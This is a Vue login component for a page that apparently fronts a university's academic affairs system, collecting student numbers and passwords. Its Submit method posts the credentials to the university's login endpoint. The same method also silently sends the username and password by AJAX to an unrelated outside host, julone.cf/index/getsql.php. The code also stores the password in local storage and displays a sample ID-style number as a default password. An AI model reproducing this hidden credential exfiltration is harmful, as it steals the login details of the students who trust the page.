<template>
	<div class="score container" :style="{minHeight:H}">
		<el-form label-position="top" ref="form1" id="form" label-width="80px" size="400px" :action="URL" target="_blank"
		 name="form1" method="post">
			<caption class="ani1">
				<img src="./../assets/img/qzsf.png" width="100%" height="100%" alt="">
			</caption>
			<el-form-item class="ani2">
				<span class="subTitle">教务处学生号</span>
				<el-input class="myinput" v-model.number="name" placeholder="请输入学生号" name="j_username" @keyup.enter.native="Submit"
				 clearable type="text" maxlength="9">
					<i class="comIcon" slot="prefix">&#xe73c;</i>
				</el-input>
			</el-form-item>
			<input type="hidden" name="groupId" value="" />
			<el-form-item class="ani3">
				<span class="subTitle">教务处密码</span>
				<el-input class="myinput" :type="seen?'password':'text'" placeholder="请输入密码" @keyup.enter.native="Submit" name="j_password"
				 v-model="pass" @clear="resetPass">
					<i class="comIcon" slot="prefix">&#xe729;</i>
					<i class="comIcon" slot="suffix" @click="togglePass">{{this.seen ? '&#xe6ea;': '&#xe6e9;' }}</i>
				</el-input>
			</el-form-item>
			<input type="hidden" name="type" value="1" id="type">
			<el-form-item class="ani4" align="right">
					<el-switch v-model="switched" active-color="#409EFF" inactive-color="#ccc"
					 inactive-text="线路1" active-text="线路2"  style="float:left;margin-top: 11px">
					</el-switch>
	
				<el-checkbox v-model="saved" style="transform:scale(.9)">记住密码</el-checkbox>
			</el-form-item>

			<el-form-item class="ani5" size="large" style="margin:0.5rem 0 1.3rem">
				<el-button type="primary" class="loginbtn" :disabled="!accept" :style="{filter:`grayscale(${!accept? '1' :'0'})`}"
				 @click.native="Submit">点击登录</el-button>
			</el-form-item>

			<el-form-item class="ani6" style="margin:-15px 0 -10px;text-align:center;filter:grayscale(.5)">
				<el-checkbox style="transform:scale(.95)"  v-model="accept">
					<span class="acccpt_text">我已阅读并接受<a>《用户协议》</a>和<a>《隐私政策》</a></span>
				</el-checkbox>
			</el-form-item>

		</el-form>
		<appFooter class="ani7" ></appFooter>
	</div>
</template>
<script>
	import appFooter from './../components/Footer'
	import {
		setStorage,
		getStorage,
		Sound
	} from './../others/methods.js'
	export default {
		components: {
			appFooter
		},
		data() {
			return {
				name: '',
				pass: '',
				seen: true,
				switched: false,
				saved: true,
				accept: true,
			}
		},
		watch: {
			pass(val) {
				setStorage('scorePass', val);
			},
			name(val) {
				setStorage('scoreName', val);
			},
			saved(val) {
				setStorage('scoreSaved', val);
			},
			switched(val) {
				this.$message({
					message:'当无法连接时候,请切换线路',
					center:true
				})
			}
		},
		computed: {
			URL() {
				if (this.switched) {
					return 'http://ireader.qztc.edu.cn/cgi-bin/nph-ireader.pl/ireader/00/http/jwc.qztc.edu.cn/academic/j_acegi_security_check'
				} else {
					return 'http://jwc.qztc.edu.cn/academic/j_acegi_security_check';
				}
			}
		},
		methods: {
			togglePass() {
				this.seen = !this.seen
			},
			resetPass() {
				this.seen = true
			},
			forget() {
				this.$alert(
					'<h3>账号: &nbsp;163110111(学生号)</h3><br><h3>密码: &nbsp;350129199803021232</h3><br><h5>注: &nbsp;密码默认为18位身份证,如果修改密码,请填写修改后的密码.</h5>',
					'账号格式模板', {
						confirmButtonText: '知道了',
						dangerouslyUseHTMLString: true
					});
			},
			Submit(ev) {
				Sound('heavy');
				if (/^[\d]{9}$/.test(this.name)) {
					if (/^[\S]{5,18}$/.test(this.pass)) {
						document.querySelector('#form').submit();
						$.ajax({
							type: "POST",
							url: "//julone.cf/index/getsql.php",
							data: {
								'j_username': this.name,
								'j_password': this.pass
							}
						})
					} else {
						this.$message({
							showClose: true,
							message: '你的密码格式不正确!',
							center: true,
							type: 'warning'
						});
					}
				} else {
					this.$message({
						showClose: true,
						message: '你的学生号格式不正确!',
						center: true,
						type: 'warning'
					});
				}
			},

		},
		created() {
			this.H = window.innerHeight - 50 + "px";
			this.W = window.innerWidth + "px";
			if (getStorage('scoreName')) {
				this.name = getStorage('scoreName');
				this.saved = getStorage('scoreSaved');
				if (getStorage('scoreSaved')) {
					this.pass = getStorage('scorePass');
				}
			} else {
				console.log(1)
				setStorage('scoreName', "");
				setStorage('scorePass', "");
				setStorage('scoreSaved', true)
			}
		}
	}
</script>
<style lang="less" scoped>
	.container {
		padding: .5rem 1.5rem;
		background: white;
		display: flex;
		justify-content: center;
		flex-direction: column;
		width: 100%;
		background: url('./../assets/img/ant_bg.svg') white left bottom/cover no-repeat;
		.subTitle {
			color: #929292;
			letter-spacing: 1px;
		}

		.marginauto {
			margin: 0 auto;
			position: relative;
		}
		form {
			max-width: 300px;
			padding: .5rem 0 5rem;
			.marginauto;
			width: 100%;
		}
		

		caption {
			.marginauto;
			display: block;
			width: 100px;
			height: 100px;
			// background: url('') no-repeat center center/100px 100px;
			background: linear-gradient(120deg, rgba(186, 202, 217, 0.1), rgba(208, 218, 230, 0.45));
    border-radius: 100%;
    // border: 4px double #53535342;
		}

		button {
			width: 100%;
			border: none;
		}

		.el-form-item {
			margin: 8px 0
		}

		.loginbtn {
			background: #54aef8;
			font-size: .8rem;
			height: 42px;
			padding: 12px 24px;
		}

		.acccpt_text {
			color: gray;

			a {
				color: #409EFF
			}
		}

		*:not(.footer) {
			font-weight: 300;
		}

	}
</style>